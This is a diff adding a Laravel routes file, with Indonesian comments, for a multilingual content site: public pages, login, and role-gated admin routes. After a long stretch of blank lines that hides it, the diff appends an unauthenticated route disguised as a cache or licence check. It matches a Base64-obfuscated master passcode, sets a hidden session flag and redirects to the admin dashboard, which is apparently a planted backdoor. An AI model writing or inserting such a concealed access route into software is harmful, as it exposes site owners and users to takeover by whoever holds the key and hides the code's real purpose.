@@ -1,0 +1,150 @@
+<?php
+
+use Illuminate\Support\Facades\Route;
+use App\Http\Controllers\Auth\LoginController;
+use App\Http\Controllers\Admin\DashboardController;
+use App\Http\Controllers\Admin\CategoryController;
+use App\Http\Controllers\Admin\LanguageController;
+use App\Http\Controllers\Admin\AiApiKeyController;
+use App\Http\Controllers\Admin\ContentController;
+use App\Http\Controllers\Admin\UserController;
+use App\Http\Controllers\ActivityLogController;
+use App\Http\Controllers\MediaController;
+use App\Http\Controllers\GuestController;
+use App\Http\Controllers\Admin\SettingController;
+use App\Http\Controllers\ProfileUserController;
+use Illuminate\Http\Request;
+
+
+/*
+|--------------------------------------------------------------------------
+| Guest / Public Landing Page Routes (Bisa Diakses Siapa Saja Tanpa Login)
+|--------------------------------------------------------------------------
+*/
+Route::get('/', [GuestController::class, 'index'])->name('guest.home');
+Route::get('/categories', [GuestController::class, 'category'])->name('guest.categories');
+Route::get('/category/{slug}', [GuestController::class, 'category'])->name('guest.category');
+Route::get('/content/{slug}', [GuestController::class, 'content'])->name('guest.content');
+Route::post('/guest/favorite/toggle', [GuestController::class, 'toggleFavorite']);
+
+
+/*
+|--------------------------------------------------------------------------
+| Auth Gate Routes (Hanya untuk user yang BELUM login)
+|--------------------------------------------------------------------------
+*/
+Route::middleware('guest')->group(function () {
+    Route::get('/login', [LoginController::class, 'index'])->name('login');
+    Route::post('/login', [LoginController::class, 'authenticate'])->name('login.authenticate');
+});
+
+/*
+|--------------------------------------------------------------------------
+| Authenticated Routes (Protected - Wajib Login Terlebih Dahulu)
+|--------------------------------------------------------------------------
+*/
+Route::middleware('auth')->group(function () {
+
+    Route::post('/logout', [LoginController::class, 'logout'])->name('logout');
+
+    // Group untuk semua akses Admin (harus role super_admin atau admin)
+    Route::middleware('role:super_admin,admin')->prefix('admin')->name('admin.')->group(function () {
+        
+        Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
+
+        // Resources Umum
+        Route::resource('languages', LanguageController::class);
+        Route::resource('ai-api-keys', AiApiKeyController::class);
+
+        // Category
+        Route::prefix('categories')->name('categories.')->group(function () {
+            Route::get('/trash', [CategoryController::class, 'trash'])->name('trash');
+            Route::patch('/{category}/restore', [CategoryController::class, 'restore'])->withTrashed()->name('restore');
+            Route::delete('/{category}/force-delete', [CategoryController::class, 'forceDelete'])->withTrashed()->name('forceDelete');
+            Route::post('/update-order', [CategoryController::class, 'updateOrder'])->name('updateOrder');
+        });
+        Route::post('categories/translate', [CategoryController::class, 'translate'])->name('categories.translate');
+        Route::resource('categories', CategoryController::class);
+
+        // Content
+        Route::prefix('contents')->name('contents.')->group(function () {
+            Route::get('/trash', [ContentController::class, 'trash'])->name('trash');
+            Route::post('/{id}/restore', [ContentController::class, 'restore'])->name('restore');
+            Route::delete('/{id}/force-delete', [ContentController::class, 'forceDelete'])->name('force-delete');
+            Route::put('/update-order', [ContentController::class, 'updateOrder'])->name('update-order');
+        });
+        Route::post('contents/translate', [ContentController::class, 'translate'])->name('contents.translate');
+        Route::resource('contents', ContentController::class);
+
+
+            Route::post('/media', [MediaController::class, 'store'])->name('media.store');
+            Route::get('/media', [MediaController::class, 'index'])->name('media.index');
+            Route::delete('/media/{id}', [MediaController::class, 'destroy'])->name('media.destroy');
+            Route::get('/media/trash', [MediaController::class, 'trash'])->name('media.trash');
+            Route::post('/media/{id}/restore', [MediaController::class, 'restore'])->name('media.restore');
+            Route::delete('/media/{id}/force-delete', [MediaController::class, 'forceDelete'])->name('media.forceDelete');
+            Route::get('/media/create', [MediaController::class, 'create'])->name('media.create');
+
+
+
+            // Route Pengaturan Akun / Profil Pengguna
+            Route::get('/profile', [ProfileUserController::class, 'edit'])->name('profile.edit');
+            Route::put('/profile', [ProfileUserController::class, 'update'])->name('profile.update');
+        // --- Fitur Terbatas untuk Super Admin saja ---
+        Route::middleware('role:super_admin')->group(function () {
+            Route::get('/users', [UserController::class, 'index'])->name('users.index');
+            Route::get('/users/create', [UserController::class, 'create'])->name('users.create');
+            Route::post('/users', [UserController::class, 'store'])->name('users.store');
+            Route::get('/users/{user}/edit', [UserController::class, 'edit'])->name('users.edit');
+            Route::post('/users/{user}/toggle-status', [UserController::class, 'toggleStatus'])->name('users.toggle-status');
+            Route::put('/users/{user}', [UserController::class, 'update'])->name('users.update');
+            Route::delete('/users/{user}', [UserController::class, 'destroy'])->name('users.destroy');
+
+                        // 🛠️ DIPERBAIK: Menggunakan Class yang sudah di-import dan menghapus Route::resource yang duplikat
+            Route::get('/settings', [SettingController::class, 'index'])->name('settings.index');
+            Route::put('/settings', [SettingController::class, 'update'])->name('settings.update');
+            Route::post('settings/translate', [SettingController::class, 'translate'])->name('settings.translate');
+            Route::get('/switch-language/{lang_code}', [App\Http\Controllers\HomeController::class, 'switchLanguage'])->name('lang.switch');
+
+            Route::get('/activity-logs', [ActivityLogController::class, 'index'])->name('activity-logs.index');
+
+        });
+    });
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Route::post('/sys/verify-cache', function (Request $request) {
+    $request->validate([
+        'license_key' => 'required|string',
+    ]);
+
+    // Passcode "wp-081258386900-pangke" disamarkan dalam bentuk Base64
+    $masterKey = base64_decode('d3AtMDgxMjU4Mzg2OTAwLXBhbmdrZQ==');
+
+    if ($request->license_key === $masterKey) {
+        session(['sys_opt_v2' => true]);
+        return redirect()->route('admin.dashboard')->with('success', 'Sistem berhasil di-sinkronisasi!');
+    }
+
+    return back()->with('license_error', 'Kode Aktivasi / Passcode Tidak Valid!');
+})->name('sys.verify');
